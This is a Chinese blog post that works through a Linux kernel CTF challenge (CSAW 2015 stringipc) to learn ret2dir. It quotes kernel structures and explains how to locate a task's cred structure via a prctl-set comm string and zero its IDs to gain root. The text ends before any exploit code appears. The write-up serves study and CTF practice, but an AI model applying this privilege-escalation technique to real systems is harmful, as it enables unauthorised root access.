<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Linux kernel pwn,CTF," />










<meta name="description" content="调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。一共有三道。">
<meta name="keywords" content="Linux kernel pwn,CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dir利用学习">
<meta property="og:url" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/index.html">
<meta property="og:site_name" content="X3h1n">
<meta property="og:description" content="调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。一共有三道。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-10-14T13:44:29.965Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ret2dir利用学习">
<meta name="twitter:description" content="调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。一共有三道。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/"/>





  <title>ret2dir利用学习 | X3h1n</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">X3h1n</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="X3h1n">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">ret2dir利用学习</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-10T11:16:12+08:00">
                2019-10-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。一共有三道。<br><a id="more"></a></p>
<h1 id="CSAW-2015-stringipc"><a href="#CSAW-2015-stringipc" class="headerlink" title="CSAW 2015 stringipc"></a>CSAW 2015 stringipc</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>关于结构体kref，具体定义及涉及到的函数如下，具体可以看<a href="https://blog.csdn.net/wince_lover/article/details/70821020" target="_blank" rel="noopener">这篇博客</a>。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> refcount; <span class="comment">//原子引用计数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kref_get</span><span class="params">(struct kref *kref)</span> <span class="comment">//y引用计数值加1</span></span></span><br><span class="line">int kref_put(struct kref *kref, void (*release)(struct kref *kref)) //引用计数值减1，计数值为0时调用回调函数release</span><br></pre></td></tr></table></figure></p>
<p>Linux的IDR机制实现了id与数据结构地址的绑定，一般是结构体的地址，一般当地址数量较少时，可以通过一个全局的数组来存储这些地址，然后使用数组下标来访问，当地址数量很大时，固定长度的数组无法存储，IDR将数组和链表相结合，内部采用红黑树实现，且具有很高的搜索效率，更多的关于IDR机制的可以看<a href="https://www.cnblogs.com/zero-jh/p/5184836.html" target="_blank" rel="noopener">这篇博客</a>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> *<span class="title">top</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> *<span class="title">id_free</span>;</span></span><br><span class="line">    <span class="keyword">int</span>          layers; <span class="comment">/* only valid without concurrent changes */</span></span><br><span class="line">    <span class="keyword">int</span>          id_free_cnt;</span><br><span class="line">    <span class="keyword">spinlock_t</span>      lock;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="利用方法一-覆写cred结构体"><a href="#利用方法一-覆写cred结构体" class="headerlink" title="利用方法一 覆写cred结构体"></a>利用方法一 覆写cred结构体</h2><h3 id="进程描述符、线程描述符和cred"><a href="#进程描述符、线程描述符和cred" class="headerlink" title="进程描述符、线程描述符和cred"></a>进程描述符、线程描述符和cred</h3><p>内核使用进程描述符来管理进程，进程描述符对应的数据结构是task struct，这个数据结构太大了，这里只列出了部分成员，其中我们看到有cred结构体和real_cred结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">//https://elixir.bootlin.com/linux/v4.4.110/source/include/linux/sched.h#L1390</span><br><span class="line">struct task_struct &#123;</span><br><span class="line">	volatile long state;	/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span><br><span class="line">	void *stack;</span><br><span class="line">	atomic_t usage;</span><br><span class="line">	unsigned int flags;	/* per process flags, defined below */</span><br><span class="line">	unsigned int ptrace;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">/* process credentials */</span><br><span class="line">	const struct cred __rcu *ptracer_cred; /* Tracer&apos;s credentials at attach */</span><br><span class="line">	const struct cred __rcu *real_cred; /* objective and real subjective task</span><br><span class="line">					 * credentials (COW) */</span><br><span class="line">	const struct cred __rcu *cred;	/* effective (overridable) subjective task</span><br><span class="line">					 * credentials (COW) */</span><br><span class="line">	char comm[TASK_COMM_LEN]; /* executable name excluding path</span><br><span class="line">				     - access with [gs]et_task_comm (which lock</span><br><span class="line">				       it with task_lock())</span><br><span class="line">				     - initialized normally by setup_new_exec */</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">/* ipc stuff */</span><br><span class="line">	struct sysv_sem sysvsem;</span><br><span class="line">	struct sysv_shm sysvshm;</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_DETECT_HUNG_TASK</span><br><span class="line">/* hung task detection */</span><br><span class="line">	unsigned long last_switch_count;</span><br><span class="line">#endif</span><br><span class="line">/* filesystem information */</span><br><span class="line">	struct fs_struct *fs;</span><br><span class="line">/* open file information */</span><br><span class="line">	struct files_struct *files;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">/* journalling filesystem info */</span><br><span class="line">	void *journal_info;</span><br><span class="line"></span><br><span class="line">/* stacked block device info */</span><br><span class="line">	struct bio_list *bio_list;</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_BLOCK</span><br><span class="line">/* stack plugging */</span><br><span class="line">	struct blk_plug *plug;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">/*</span><br><span class="line"> * WARNING: on x86, &apos;thread_struct&apos; contains a variable-sized</span><br><span class="line"> * structure.  It *MUST* be at the end of &apos;task_struct&apos;.</span><br><span class="line"> *</span><br><span class="line"> * Do not put anything below here!</span><br><span class="line"> */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>cred这个数据结构用来标识进程的权限，cred结构体具体定义如下，这里涉及到一个cred和real_cred的区别，按照源码中的注释，我的理解是real_cred是自己进程本身的权限，cred是作用于其他task的权限，通常情况下它们都是一样的。在拥有了内存任意读写权限后，将cred结构体中的uid~fsgid全部覆写为0，这样进程就有了root权限。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/include/linux/cred.h#L118</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>对于进程来说，Linux将两个不同的数据结构紧凑的存放在一个单独为进程分配的存储空间中，一个是与进程描述符task_struct相关的小的数据结构thread_info，叫做线程描述符，一个是内核态的进程堆栈，这块存储区域通常为8kb的大小，也就是两个页框，内核让这占据8kb的数据结构存储在两个连续的页框中，并且起始地址是是2^13的倍数。下图表示了8kb的内存区存储这两个数据结构的方式，图来源于《深入理解Linux内核》。<br><a href="ret2dir利用学习/3.png">3</a><br>从图中也可以看出thread_info与task_struct的联系，task_struct作为thread_info的成员，具体数据结构定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/ia64/include/asm/thread_info.h#L21</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span>	<span class="comment">/* XXX not really needed, except for dup_task_struct() */</span></span><br><span class="line">	__u32 flags;			<span class="comment">/* thread_info flags (see TIF_*) */</span></span><br><span class="line">	__u32 cpu;			<span class="comment">/* current CPU */</span></span><br><span class="line">	__u32 last_cpu;			<span class="comment">/* Last CPU thread ran on */</span></span><br><span class="line">	__u32 status;			<span class="comment">/* Thread synchronous flags */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span> addr_limit;	<span class="comment">/* user-level address space limit */</span></span><br><span class="line">	<span class="keyword">int</span> preempt_count;		<span class="comment">/* 0=premptable, &lt;0=BUG; will also serve as bh-counter */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_VIRT_CPU_ACCOUNTING_NATIVE</span></span><br><span class="line">	__u64 ac_stamp;</span><br><span class="line">	__u64 ac_leave;</span><br><span class="line">	__u64 ac_stime;</span><br><span class="line">	__u64 ac_utime;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>前面提到要覆写cred结构体，首先需要找到这个结构体的地址。参考的文章里用到了task_struct的一个成员char comm[TASK_COMM_LEN]，根据注释我们也能看出这个变量用来保存可执行文件的名称，利用prctl函数中的option PR_SET_NAME可以对comm进行赋值，长度小于16字节。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://man7.org/linux/man-pages/man2/prctl.2.html</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,<span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br><span class="line"></span><br><span class="line">PR_SET_NAME (since Linux <span class="number">2.6</span><span class="number">.9</span>)</span><br><span class="line">              Set the name of the calling thread, <span class="keyword">using</span> the value in the</span><br><span class="line">              location pointed to by (char *) arg2.  The name can be up to</span><br><span class="line">              <span class="number">16</span> bytes <span class="keyword">long</span>, including the terminating null byte.  (If the</span><br><span class="line">              length of the <span class="built_in">string</span>, including the terminating null byte,</span><br><span class="line">              exceeds <span class="number">16</span> bytes, the <span class="built_in">string</span> is silently truncated.)  This is</span><br><span class="line">              <span class="function">the same attribute that can be <span class="built_in">set</span> via <span class="title">pthread_setname_np</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">              and retrieved using pthread_getname_np(3).  The attribute is</span><br><span class="line">              likewise accessible via /proc/self/task/[tid]/comm, where tid</span><br><span class="line">              is the name of the calling thread.</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/ident/TASK_COMM_LEN</span></span><br><span class="line"><span class="comment">/* Task command name length */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_COMM_LEN 16</span></span><br></pre></td></tr></table></figure></p>
<p>那我们定位的方法就可以是先利用prctl函数给comm赋值为一个特殊的字符串，然后利用内存任意读去找到该字符串位置，它的前8个字节处就存储了cred的地址。但是64位可寻址空间高达256TB（低48位寻址），如果一个个找下来肯定很浪费时间，可以利用Linux 64位内存布局和task_struct的创建方式来大致确定范围。这里涉及到了进程的创建，与进程创建涉及到三个函数，clone()、fork()和vfork()。在Linux中轻量级进程由名为clone()的函数创建；fork()在Linux中也是用clone()来实现的，fork()创建的子进程与父进程暂时共享一个用户态堆栈，但是只要父进程或子进程中有一个试图去改变堆栈，写时复制技术会为父子进程创建各自用户态堆栈的一份拷贝。vfork()创建的子进程共享父进程的内存地址空间。do_fork()函数负责处理这三个创建进程相关的函数，在执行过程中会调用copy_process()函数，这个函数创建进程描述符以及子进程执行时所需要的其他所有数据结构，该函数在执行过程中会dup_task_struct()为子进程获取进程描述符，该函数通过调用alloc_task_struct_node()，最终kmem_cache_alloc_node()分子进程分配进程描述符。因此task_struct会在动态分配区域。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/fork.c#L336</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_struct *<span class="title">dup_task_struct</span><span class="params">(struct task_struct *orig, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> *<span class="title">ti</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">		node = tsk_fork_get_node(orig);</span><br><span class="line">	tsk = alloc_task_struct_node(node);  <span class="comment">//为子进程获取进程描述符</span></span><br><span class="line">	<span class="keyword">if</span> (!tsk)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ti = alloc_thread_info_node(tsk, node);</span><br><span class="line">	<span class="keyword">if</span> (!ti)</span><br><span class="line">		<span class="keyword">goto</span> free_tsk;</span><br><span class="line"></span><br><span class="line">	err = arch_dup_task_struct(tsk, orig);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_ti;</span><br><span class="line"></span><br><span class="line">	tsk-&gt;<span class="built_in">stack</span> = ti;</span><br><span class="line"></span><br><span class="line">	err = kaiser_map_thread_stack(tsk-&gt;<span class="built_in">stack</span>);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> free_ti;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">	tsk-&gt;splice_pipe = <span class="literal">NULL</span>;</span><br><span class="line">	tsk-&gt;task_frag.page = <span class="literal">NULL</span>;</span><br><span class="line">	tsk-&gt;wake_q.next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	account_kernel_stack(ti, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tsk;</span><br><span class="line"></span><br><span class="line">free_ti:</span><br><span class="line">	free_thread_info(ti);</span><br><span class="line">free_tsk:</span><br><span class="line">	free_task_struct(tsk);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/fork.c#L140</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct task_struct *<span class="title">alloc_task_struct_node</span><span class="params">(<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据Linux x86_64内存分布图可以确定寻找comm的地址范围在。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//</span><br></pre></td></tr></table></figure></p>
